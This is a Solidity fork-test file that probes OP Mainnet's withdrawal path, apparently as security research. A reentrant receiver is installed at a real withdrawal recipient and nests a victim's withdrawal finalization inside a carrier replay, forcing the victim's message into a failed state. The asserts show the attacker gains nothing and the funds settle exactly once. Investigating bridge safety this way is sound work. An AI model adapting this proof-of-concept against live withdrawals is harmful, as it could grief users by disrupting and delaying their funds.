// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./Base.sol";

/// @notice Code is installed at the real carrier withdrawal recipient on the fork.
///         It rejects the first delivery, then uses the carrier replay to nest a
///         second real withdrawal finalization.
contract CATKBNestedReceiver {
    IPortal internal constant PORTAL = IPortal(0xbEb5Fc579115071764c7423A4f12eDde41f106Ed);

    bool public armed;
    bool public nestedOk;
    bytes public payload;

    function arm(bytes calldata _payload) external {
        payload = _payload;
        armed = true;
    }

    receive() external payable {
        require(armed, "reject first delivery");
        (nestedOk,) = address(PORTAL).call(payload);
        require(nestedOk, "nested finalization failed");
    }
}

interface IMessageState {
    function failedMessages(bytes32) external view returns (bool);
    function successfulMessages(bytes32) external view returns (bool);
}

interface IERC20Balance {
    function balanceOf(address) external view returns (uint256);
}

interface IL1ERC721BridgeTarget {
    function messenger() external view returns (address);
    function otherBridge() external view returns (address);
    function finalizeBridgeERC721(address, address, address, address, uint256, bytes calldata) external;
}

/// @notice Independent CATK-B fork experiments. The carrier and victims are
///         real, proven, unfinalized OP Mainnet withdrawals at block 26,433,900.
///         No privileged sender or fabricated proof is used. vm.etch is limited
///         to substituting the carrier recipient's application behavior.
contract CATKBTest is Base {
    address internal constant ATTACKER = address(0xCA7B);
    address internal constant INK_MESSENGER = 0x69d3Cf86B2Bf1a9e99875B7e2D9B6a84426c171f;
    IL1ERC721BridgeTarget internal constant L1_ERC721_BRIDGE =
        IL1ERC721BridgeTarget(0x5a7749f83b81B301cAb5f48EB8516B986DAef23D);

    struct ActiveFailure {
        address messenger;
        bytes32 messageHash;
        uint256 nonce;
        address sender;
        address target;
        uint256 value;
        uint256 minGasLimit;
        bytes message;
    }

    function setUp() public {
        _fork();
    }

    function _decodeRelay(bytes memory _data)
        internal
        pure
        returns (uint256 nonce, address sender, address target, uint256 value, uint256 minGas, bytes memory message)
    {
        bytes memory args = new bytes(_data.length - 4);
        for (uint256 i; i < args.length; i++) args[i] = _data[i + 4];
        return abi.decode(args, (uint256, address, address, uint256, uint256, bytes));
    }

    function _legacyETHRecipient(bytes memory _message) internal pure returns (address recipient) {
        require(bytes4(_message) == bytes4(0x1635f5fd), "not legacy ETH finalization");
        bytes memory args = new bytes(_message.length - 4);
        for (uint256 i; i < args.length; i++) args[i] = _message[i + 4];
        (, recipient,,) = abi.decode(args, (address, address, uint256, bytes));
    }

    function _erc20Settlement(bytes memory _message)
        internal
        pure
        returns (address token, address recipient, uint256 amount)
    {
        require(bytes4(_message) == bytes4(0xa9f9e675), "not ERC20 finalization");
        bytes memory args = new bytes(_message.length - 4);
        for (uint256 i; i < args.length; i++) args[i] = _message[i + 4];
        address ignoredRemote;
        address ignoredFrom;
        bytes memory ignoredData;
        (token, ignoredRemote, ignoredFrom, recipient, amount, ignoredData) =
            abi.decode(args, (address, address, address, address, uint256, bytes));
        ignoredRemote;
        ignoredFrom;
        ignoredData;
    }

    function _activeFailure(string memory _vectors, uint256 _index)
        internal
        view
        returns (ActiveFailure memory item)
    {
        string memory key = string.concat(".messages[", vm.toString(_index), "]");
        item.messenger = vm.parseJsonAddress(_vectors, string.concat(key, ".messenger"));
        item.messageHash = vm.parseJsonBytes32(_vectors, string.concat(key, ".message_hash"));
        item.nonce = vm.parseJsonUint(_vectors, string.concat(key, ".nonce"));
        item.sender = vm.parseJsonAddress(_vectors, string.concat(key, ".sender"));
        item.target = vm.parseJsonAddress(_vectors, string.concat(key, ".target"));
        item.value = vm.parseJsonUint(_vectors, string.concat(key, ".value"));
        item.minGasLimit = vm.parseJsonUint(_vectors, string.concat(key, ".min_gas_limit"));
        item.message = vm.parseJsonBytes(_vectors, string.concat(key, ".message"));
    }

    function _replayAllActiveZeroValueFailures(bool _reverse) internal returns (uint256 recovered) {
        string memory vectors = vm.readFile("active-zero-value-replays.json");
        uint256 attackerBefore = ATTACKER.balance;
        for (uint256 step; step < 15; step++) {
            uint256 i = _reverse ? 14 - step : step;
            ActiveFailure memory item = _activeFailure(vectors, i);
            assertEq(item.messenger, address(L1CDM));
            assertEq(item.value, 0);
            assertTrue(IMessageState(item.messenger).failedMessages(item.messageHash));
            assertFalse(IMessageState(item.messenger).successfulMessages(item.messageHash));

            vm.prank(ATTACKER);
            IMessenger(item.messenger).relayMessage(
                item.nonce, item.sender, item.target, item.value, item.minGasLimit, item.message
            );
            assertEq(ATTACKER.balance, attackerBefore);
            assertTrue(IMessageState(item.messenger).failedMessages(item.messageHash));
            if (IMessageState(item.messenger).successfulMessages(item.messageHash)) {
                recovered++;
                console.logBytes32(item.messageHash);
            }
        }
        assertEq(address(L1CDM).balance, 0);
        console.log("recovered zero-value messages", recovered);
    }

    function _forceThenSettle(uint256 _victimIndex, uint8 _settlementKind) internal {
        Prove memory carrier = _load(34); // 0.012091417834329393 ETH StandardBridge withdrawal
        Prove memory victim = _load(_victimIndex);
        _mature(carrier.hash, carrier.submitter);
        _mature(victim.hash, victim.submitter);

        (,,,,, bytes memory carrierMessage) = _decodeRelay(carrier.wd.data);
        address carrierRecipient = _legacyETHRecipient(carrierMessage);
        assertEq(carrierRecipient.code.length, 0, "carrier recipient is not an EOA at pinned block");

        CATKBNestedReceiver template = new CATKBNestedReceiver();
        vm.etch(carrierRecipient, address(template).code);
        CATKBNestedReceiver receiver = CATKBNestedReceiver(payable(carrierRecipient));

        bytes32 carrierMessageHash = keccak256(carrier.wd.data);
        bytes32 victimMessageHash = keccak256(victim.wd.data);
        uint256 lockboxBefore = LOCKBOX.balance;
        uint256 messengerBefore = address(L1CDM).balance;
        uint256 attackerBefore = ATTACKER.balance;
        uint256 carrierRecipientBefore = carrierRecipient.balance;

        // First carrier finalization reaches the deployed StandardBridge, whose
        // ETH transfer is rejected by the substituted recipient.
        vm.prank(ATTACKER);
        PORTAL.finalizeWithdrawalTransactionExternalProof(carrier.wd, carrier.submitter);
        assertTrue(PORTAL.finalizedWithdrawals(carrier.hash));
        assertTrue(L1CDM.failedMessages(carrierMessageHash));
        assertFalse(L1CDM.successfulMessages(carrierMessageHash));
        assertEq(address(L1CDM).balance, messengerBefore + carrier.wd.value);

        receiver.arm(
            abi.encodeCall(IPortal.finalizeWithdrawalTransactionExternalProof, (victim.wd, victim.submitter))
        );

        // During direct carrier replay, messenger xDomainMsgSender is occupied.
        // The nested victim relay therefore returns early as failed, while its
        // portal withdrawal is finalized and its ETH moves to the messenger.
        (uint256 n, address s, address t, uint256 v, uint256 g, bytes memory m) = _decodeRelay(carrier.wd.data);
        vm.prank(ATTACKER);
        L1CDM.relayMessage(n, s, t, v, g, m);
        assertTrue(receiver.nestedOk());
        assertTrue(L1CDM.successfulMessages(carrierMessageHash));
        assertTrue(PORTAL.finalizedWithdrawals(victim.hash));
        assertTrue(L1CDM.failedMessages(victimMessageHash));
        assertFalse(L1CDM.successfulMessages(victimMessageHash));
        assertEq(lockboxBefore - LOCKBOX.balance, carrier.wd.value + victim.wd.value);
        assertEq(address(L1CDM).balance, messengerBefore + victim.wd.value);
        assertEq(carrierRecipient.balance - carrierRecipientBefore, carrier.wd.value);

        address victimRecipient;
        address victimToken;
        uint256 victimAmount;
        uint256 recipientBefore;
        if (_settlementKind == 1) {
            (,,,,, bytes memory victimInner) = _decodeRelay(victim.wd.data);
            victimRecipient = _legacyETHRecipient(victimInner);
            recipientBefore = victimRecipient.balance;
        } else if (_settlementKind == 2) {
            (,,,,, bytes memory victimInner) = _decodeRelay(victim.wd.data);
            (victimToken, victimRecipient, victimAmount) = _erc20Settlement(victimInner);
            recipientBefore = IERC20Balance(victimToken).balanceOf(victimRecipient);
        }

        // The replay caller cannot alter sender, target, calldata, or value and
        // receives nothing. The committed target settles exactly once.
        (n, s, t, v, g, m) = _decodeRelay(victim.wd.data);
        vm.prank(ATTACKER);
        L1CDM.relayMessage(n, s, t, v, g, m);
        assertTrue(L1CDM.successfulMessages(victimMessageHash));
        assertEq(address(L1CDM).balance, messengerBefore);
        assertEq(ATTACKER.balance, attackerBefore);
        if (_settlementKind == 1) assertEq(victimRecipient.balance - recipientBefore, victim.wd.value);
        if (_settlementKind == 2) {
            assertEq(IERC20Balance(victimToken).balanceOf(victimRecipient) - recipientBefore, victimAmount);
        }

        vm.expectRevert("CrossDomainMessenger: message has already been relayed");
        vm.prank(ATTACKER);
        L1CDM.relayMessage(n, s, t, v, g, m);
    }

    function test_realStandardBridgeVictimForcedFailedThenSettlesExactly() public {
        _forceThenSettle(36, 1); // 2,000 ETH StandardBridge withdrawal
    }

    function test_realApplicationVictimForcedFailedThenSettlesExactly() public {
        _forceThenSettle(1, 0); // 363.438235322873695226 ETH onMessageReceived withdrawal
    }

    function test_realERC20BridgeVictimForcedFailedThenSettlesExactly() public {
        _forceThenSettle(7, 2); // real finalizeBridgeERC20 withdrawal
    }

    function test_deployedERC721BridgeRequiresMessengerAndCommittedL2Bridge() public {
        assertEq(L1_ERC721_BRIDGE.messenger(), address(L1CDM));
        assertEq(L1_ERC721_BRIDGE.otherBridge(), address(0x4200000000000000000000000000000000000014));
        vm.expectRevert("ERC721Bridge: function can only be called from the other bridge");
        vm.prank(ATTACKER);
        L1_ERC721_BRIDGE.finalizeBridgeERC721(
            address(0x1111), address(0x2222), address(0x3333), ATTACKER, 1, hex""
        );
    }

    function test_liveValueBearingFailuresAllSettledAndNoMessengerCustody() public view {
        bytes32[4] memory hashes = [
            bytes32(0x4469d07d864c41bc36ce454810ca41b0aab298b8a997658cb49d9219da263276),
            bytes32(0x940ba5ec73a0003ac5147379a5c1d8665ffb674cd11b89d3b87b69bb0cd57941),
            bytes32(0xd9204ef4371eca7b4f54ecc662bbddb826f9eafb959739adda4f88cf4d07b8fe),
            bytes32(0xfac7aaf73dc66ed712f0d756d6b0432ded6189e3ba77591daaf2557354c84445)
        ];
        assertTrue(L1CDM.failedMessages(hashes[0]));
        assertTrue(L1CDM.successfulMessages(hashes[0]));
        for (uint256 i = 1; i < hashes.length; i++) {
            assertTrue(IMessageState(INK_MESSENGER).failedMessages(hashes[i]));
            assertTrue(IMessageState(INK_MESSENGER).successfulMessages(hashes[i]));
        }
        assertEq(address(L1CDM).balance, 0);
        assertEq(INK_MESSENGER.balance, 0);
    }

    function test_falsePortalFinalizationsAreLegacyV0Duplicates() public view {
        bytes32[4] memory oldHashes = [
            bytes32(0x15b9af234b3df5e7059a34691ac3928e3eb6b262d84f6247b02923363697402d),
            bytes32(0x128a972a9a3d40610b71b99f79b30f638eeb33abd7911bffd143de65e7de5b7f),
            bytes32(0xcd29a374d0e9adb8937c65727587b079f8daa09562ecaf4fafc4b011e746860f),
            bytes32(0xaef8e13f0a6fcac3ea486125f3666b13b0b0333971bd4257a11cdec35a4b574f)
        ];
        bytes32[4] memory v1Hashes = [
            bytes32(0x894351883f40fd42e84cdee2a686ced7ab3e6f7cea314b74d47918a050739351),
            bytes32(0x05cdd55dbed13574b48797a1d5e1e63bb35baa2d6dae9ef7efba70826ab7c25c),
            bytes32(0x784923ea5b49a2d6fa65f05cbdad076260d55b03185bf2e97d752195082a534d),
            bytes32(0x69fa35cf1923ddf105269d0f3eb1384104f64f75c38711f886cb8386ae8d921a)
        ];
        for (uint256 i; i < oldHashes.length; i++) {
            assertTrue(L1CDM.successfulMessages(oldHashes[i]));
            assertFalse(L1CDM.successfulMessages(v1Hashes[i]));
            assertFalse(L1CDM.failedMessages(v1Hashes[i]));
        }
    }

    function test_liveZeroValueFailuresChronologicalReplayOrder() public {
        uint256 recovered = _replayAllActiveZeroValueFailures(false);
        assertEq(recovered, 3);
    }

    function test_liveZeroValueFailuresReverseReplayOrder() public {
        uint256 recovered = _replayAllActiveZeroValueFailures(true);
        assertEq(recovered, 3);
    }
}
